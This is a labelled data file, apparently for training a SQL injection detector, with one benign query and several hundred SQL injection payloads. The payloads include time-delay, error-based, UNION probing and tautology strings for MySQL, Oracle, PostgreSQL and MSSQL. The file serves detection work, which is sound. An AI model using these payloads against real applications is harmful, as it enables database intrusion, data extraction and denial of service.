__label__nonmalicious  SELECT column_name  FROM table1 UNION SELECT column_name FROM table2;
__label__malicious  1'  )  )   )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
__label__malicious  1' )  as vlwh where 9403 = 9403 or elt ( 5873 = 5873,sleep ( 5  )  )  #
__label__malicious  1%'  )  )   and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
__label__malicious  -5585%'  )  )   )  or 6990 = 7727
__label__malicious  1" union all select null,null,null--
__label__malicious  1" )  and make_set ( 8403 = 8403,8899 )  and  ( "akha" like "akha
__label__malicious  1"  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) 
__label__malicious  -4927'  )  )   union all select 1924,1924#
__label__malicious  1"  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  "bcxh" like "bcxh
__label__malicious  1"  )  )   as yosd where 1255 = 1255
__label__malicious  select  ( case when  ( 2783 = 9216 )  then 1 else 2783* ( select 2783 from master..sysdatabases )  end ) --
__label__malicious  1  )  )   )  and 9575 = 1640--
__label__malicious  -5643'  )  )   union all select 1515,1515#
__label__malicious  1" )  as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --
__label__malicious  1' )  and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and  ( 'lwrk' like 'lwrk
__label__malicious  1" )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( "kxws" like "kxws
__label__malicious  1 )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  
__label__malicious  1" )  and 2006 = 2006
__label__malicious  -8233' or 9538 = 1882#
__label__malicious  1"  )  )   as nsbu where 6569 = 6569 or sleep ( 5 ) #
__label__malicious  1" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
__label__malicious  1'|| ( select 'nfgq' where 1837 = 1837 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
__label__malicious  1 where 3175 = 3175 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --
__label__malicious  1'+ ( select 'jtvq' where 8288 = 8288 and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #
__label__malicious  1'|| ( select 'oxam' from dual where 7162 = 7162 and make_set ( 8403 = 8403,8899  )  )  ||'
__label__malicious  1', ( select  ( case when  ( 5217 = 5217 )  then 1 else 5217* ( select 5217 from mysql.db )  end  )  )  
__label__malicious  -3100' )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'etuj' like 'etuj
__label__malicious  1%"  )  )   )  union all select null,null,null,null,null,null,null,null,null#
__label__malicious  1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   ) +'
__label__malicious   select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1
__label__malicious  1 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) 
__label__malicious  1 )  where 4711 = 4711
__label__malicious  1"  )  )   as nwnp where 6140 = 6140
__label__malicious  -6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--
__label__malicious  -1434'  )  )   union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#
__label__malicious  -7559" or 8792 = 6905--
__label__malicious  1'+ ( select jxgx where 7446 = 7446 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
__label__malicious  '  )  )  ;waitfor delay '0:0:__TIME__'--
__label__malicious  1' and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  
__label__malicious  1'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( 'ljhc' = 'ljhc
__label__malicious  1%'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( '%' = '
__label__malicious  1' and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and 'mepp' = 'mepp
__label__malicious  -8245"  )  )   or 3038 = 3038
__label__malicious  1'+ ( select 'zkuf' where 3591 = 3591 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'
__label__malicious  -3997'+ ( select 'avjk' where 1917 = 1917 union all select 1917,1917,1917--
__label__malicious  1"  )  )   as vxkn where 2443 = 2443 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
__label__malicious  1'|| ( select 'fzcu' where 9252 = 9252 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1  )  )  ||'
__label__malicious  1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and 'pbin' = 'pbin
__label__malicious  1" where 7279 = 7279 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
__label__malicious  1 union all select null,null,null,null,null,null,null#
__label__malicious  1%'  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
__label__malicious  1 )  where 8041 = 8041
__label__malicious  1 )  union all select null,null,null--
__label__malicious  1 )  as hlcn where 1165 = 1165 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #
__label__malicious  select count ( * )  from generate_series ( 1,5000000 )  and  ( 'qpdu' = 'qpdu
__label__malicious  a
__label__malicious  -9721' )  or 9287 = 4362#
__label__malicious  1'  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  'inrm' like 'inrm
__label__malicious  1' and  ( 5116 = 1602 ) *1602
__label__malicious  1"  )  )   as phis where 4420 = 4420 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
__label__malicious  1 )  as jmib where 8130 = 8130 rlike  ( select  ( case when  ( 7885 = 3932 )  then 1 else 0x28 end  )  )  --
__label__malicious  -9014%' )  union all select 4211,4211,4211,4211,4211,4211#
__label__malicious  -3059' )  as jhbh where 4056 = 4056 or  ( 3498 = 6965 ) *6965--
__label__malicious  1' where 8469 = 8469
__label__malicious  1 )  as wuio where 5312 = 5312 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
__label__malicious  1  )  )   ) 
__label__malicious  1 where 3956 = 3956
__label__malicious  -9697 )  union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--
__label__malicious  -1031%" union all select 6832,6832,6832,6832#
__label__malicious  1'+ ( select 'sbvh' where 8539 = 8539 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  )  +'
__label__malicious  1' where 9816 = 9816 and 7533 = 7533--
__label__malicious  -5587%' )  or elt ( 1032 = 1032,3623 )  and  ( '%' = '
__label__malicious  1%'  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( '%' = '
__label__malicious   ( select * from generate_series ( 3906,3906,case when  ( 3906 = 3906 )  then 1 else 0 end )  limit 1 ) 
__label__malicious  1'  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and 'hqqj' = 'hqqj
__label__malicious  1'  )  )   )  rlike sleep ( 5 )  and   (  (   ( 'rozr' like 'rozr
__label__malicious  1" where 8734 = 8734
__label__malicious  1  )  )   as xovu where 4530 = 4530 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
__label__malicious  select  ( case when  ( 1275 = 7674 )  then 1275 else 1275* ( select 1275 from information_schema.character_sets )  end ) #
__label__malicious  select  ( case when  ( 4666 = 4666 )  then 1 else 4666* ( select 4666 from master..sysdatabases )  end ) --
__label__malicious  1 )  or elt ( 6272 = 6272,sleep ( 5  )  )   and  ( 8600 = 8600
__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'qvoy' = 'qvoy
__label__malicious  1%' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and  ( '%' = '
__label__malicious  -8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#
__label__malicious  1" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and "ekjs" like "ekjs
__label__malicious  1' and 5967 = 4184#
__label__malicious  -5597' )  or make_set ( 2490 = 2164,2164 ) 
__label__malicious  -8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#
__label__malicious  1  )  )   as ehlg where 6340 = 6340
__label__malicious   ( case when 8422 = 8452 then 1 else null end ) 
__label__malicious  -8124 )  union all select 7251,7251,7251#
__label__malicious  1%"  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  "%" = "
__label__malicious  -6720'  )  )   )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'enfe' like 'enfe
__label__malicious  1  )  )   union all select null,null,null,null,null,null,null,null,null#
__label__malicious  1 )  as qywz where 1864 = 1864 and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --
__label__malicious  1' or '1' = '1
__label__malicious  1%' )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( '%' = '
__label__malicious  -6587' )  union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--
__label__malicious  1'+ ( select zmbu where 8685 = 8685 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   ) +'
__label__malicious  1" )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( "bmbg" like "bmbg
__label__malicious  1%' )  union all select null,null,null,null,null,null--
__label__malicious  1' where 9416 = 9416
__label__malicious  -3648' where 4629 = 4629 order by 1--
__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (   ( 'juhi' like 'juhi
__label__malicious  1' )  as bscn where 6907 = 6907
__label__malicious  1%" )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( "%" = "
__label__malicious  -1219' )  or 5592 = 4835
__label__malicious  1%"  )  )   )  and elt ( 9524 = 1124,1124 )  and   (  (   ( "%" = "
__label__malicious  1'  )  )   as xqam where 6750 = 6750
__label__malicious  -4248 where 3288 = 3288 or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) --
__label__malicious  call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'ckpm' = 'ckpm
__label__malicious  1 )  as hhly where 2906 = 2906
__label__malicious  1' )  as ncou where 9166 = 9166 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) --
__label__malicious  -3230"  )  )   as kbxc where 5007 = 5007 or 2107 = 8818
__label__malicious  -2715'  )  )   or 6942 = 1636 and   (  (  'mqeq' = 'mqeq
__label__malicious  1" )  as uorp where 7208 = 7208
__label__malicious  -2048  )  )   union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--
__label__malicious  -4607'|| ( select 'wkdg' where 7524 = 7524 order by 1--
__label__malicious  1 where 8506 = 8506
__label__malicious  1' )  union all select null,null,null,null#
__label__malicious  -5526 or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #
__label__malicious  1 )  or sleep ( 5 ) 
__label__malicious  -2140  )  )   union all select 8174,8174,8174#
__label__malicious  if ( 4947 = 5350 )  select 4947 else drop function ereg--
__label__malicious  1' )  as zxho where 5907 = 5907 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
__label__malicious  1%' )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( '%' = '
__label__malicious  1 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno ) 
__label__malicious  1" )  where 2180 = 2180 and make_set ( 8403 = 8403,8899 ) --
__label__malicious  -7323%" or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and "%" = "
__label__malicious  select  ( case when  ( 4393 = 2875 )  then 1 else 4393* ( select 4393 from master..sysdatabases )  end ) --
__label__malicious  1  )  )   or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
__label__malicious  1'  )  )   and  ( 3020 = 3020 ) *6703 and   (  (  'mgfd' = 'mgfd
__label__malicious  -6760 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) # ikqw
__label__malicious  1'|| ( select 'eils' where 8308 = 8308 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
__label__malicious  1 )  as ratg where 3033 = 3033 union all select null--
__label__malicious  1"  )  )   and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (  "rvuz" like "rvuz
__label__malicious  1"  )  )   )  or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (   ( "ddun" = "ddun
__label__malicious  1 and elt ( 1210 = 1210,sleep ( 5  )  )  
__label__malicious  1" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --
__label__malicious  1, ( select  ( case when  ( 2106 = 2106 )  then  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  else 2106* ( select 2106 from master..sysdatabases )  end  )  )  
__label__malicious  1' in boolean mode )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) #
__label__malicious   or 1 = 1--
__label__malicious  1'+ ( select zukr where 9215 = 9215 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null  )  )  +'
__label__malicious  1%" )  union all select null,null,null,null--
__label__malicious  1' )  and sleep ( 5 ) 
__label__malicious  1'  )  )   and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and   (  (  'yzdp' = 'yzdp
__label__malicious  1%" or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --
__label__malicious  -1084 where 1181 = 1181 or make_set ( 9354 = 9354,7185 ) --
__label__malicious  " or 1 = 1--
__label__malicious  call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 'cixa' like 'cixa
__label__malicious  1 )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and  ( 7079 = 7079
__label__malicious  1'  )  )   as fcjk where 7755 = 7755
__label__malicious  1'|| ( select 'aojt' from dual where 8499 = 8499
__label__malicious  1%" )  and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and  ( "%" = "
__label__malicious  1" union all select null,null,null,null,null,null,null,null,null,null#
__label__malicious  -7306" or 2081 = 6847
__label__malicious  1' )  where 9516 = 9516
__label__malicious  1  )  )   or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --
__label__malicious  1%" or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
__label__malicious  1'+ ( select 'yhcf' where 8367 = 8367
__label__malicious  1%"  )  )   order by 1--
__label__malicious  1 )  where 8630 = 8630 union all select null,null--
__label__malicious  1' or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and 'ebuo' = 'ebuo
__label__malicious  -6566' )  as kggb where 9768 = 9768 order by 1--
__label__malicious   select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1
__label__malicious  1 )  as bzuh where 8041 = 8041 and 6307 = 9200#
__label__malicious  1"  )  )   )  or sleep ( 5 ) #
__label__malicious  1'+ ( select uhsy where 4596 = 4596 and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno  )  )  +'
__label__malicious   ( select chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7812 = 7812 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 )  from dual ) 
__label__malicious  1, ( select  ( case when  ( 3717 = 3717 )  then 1 else 3717* ( select 3717 from master..sysdatabases )  end  )  )  
__label__malicious  1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) 
__label__malicious  -3938%'  )  )   )  or 2034 = 7209#
__label__malicious  1' and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and 'rtbm' = 'rtbm
__label__malicious  1 )  where 1443 = 1443 union all select null,null,null,null,null#
__label__malicious  1" )  where 5065 = 5065
__label__malicious  -8364' )  union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#
__label__malicious  -1558 or elt ( 3306 = 2272,2272 ) -- ioxt
__label__malicious  1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) 
__label__malicious  1, ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4250 = 4250 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual ) 
__label__malicious  1" )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( "cdnc" like "cdnc
__label__malicious  1%'  )  )   and 2006 = 2006
__label__malicious  1" )  where 9115 = 9115
__label__malicious  1' where 8837 = 8837 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --
__label__malicious  select  ( case when  ( 4061 = 1396 )  then 4061 else 1/ ( select 0 )  end ) --
__label__malicious  1' )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) 
__label__malicious  -6554'  )  )   )  union all select 4384,4384,4384,4384,4384#
__label__malicious  1" and  ( 3020 = 3020 ) *6703
__label__malicious  1%'  )  )   rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #
__label__malicious  -5826"  )  )   union all select 7192,7192#
__label__malicious  1 )  where 9059 = 9059 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --
__label__malicious  1' )  and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and  ( 'ppwh' = 'ppwh
__label__malicious  1' )  as wtev where 5283 = 5283
__label__malicious  /**/or/**/1/**/ = /**/1
__label__malicious  1'  )  )   as ypgz where 8704 = 8704
__label__malicious  -1174" union all select 4303,4303,4303,4303#
__label__malicious  1'  )  )   )  and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --
__label__malicious  1' or elt ( 6272 = 6272,sleep ( 5  )  )   and 'wdoi' = 'wdoi
__label__malicious  1'|| ( select 'uiyj' from dual where 8320 = 8320
__label__malicious  1'|| ( select 'pxkz' where 2207 = 2207 and  ( 3020 = 3020 ) *6703 ) ||'
__label__malicious  -6680' )  or 5483 = 3031 and  ( 'zxes' = 'zxes
__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT global_name FROM global_name  )  )   AND 'i' = 'i
__label__malicious  1" where 1809 = 1809 and make_set ( 8403 = 8403,8899 ) --
__label__malicious  1'|| ( select 'dfmw' from dual where 1723 = 1723
__label__malicious  1'+ ( select 'kicv' where 1976 = 1976 and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual  )  )  +'
__label__malicious   else dbms_lock.sleep ( 0 ) 
__label__malicious   select * from users where id = 1 or "?[" or 1 = 1 -- 1
__label__malicious  1 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) -- loao
__label__malicious  1' )  and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and  ( 'ngxz' = 'ngxz
__label__malicious  select case when 9390 = 5752 then 1 else null end--
__label__malicious  -8686" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --
__label__malicious  1' )  and 7533 = 7533
__label__malicious  1'  )  )   as prxm where 1267 = 1267 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
__label__malicious  1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'fmkz' like 'fmkz
__label__malicious  select pg_sleep ( 5 )  and   (  (   ( "%" = "
__label__malicious  1' in boolean mode )  or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) #
__label__malicious  1'|| ( select 'ltqo' where 9080 = 9080 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) ||'
__label__malicious  -2612" )  as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --
__label__malicious  1"  )  )   as uxnc where 8041 = 8041 and 9198 = 9198--
__label__malicious  1'  )  )   )  and 8162 = 1687 and   (  (   ( 'tdyr' like 'tdyr
__label__malicious  1' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) 
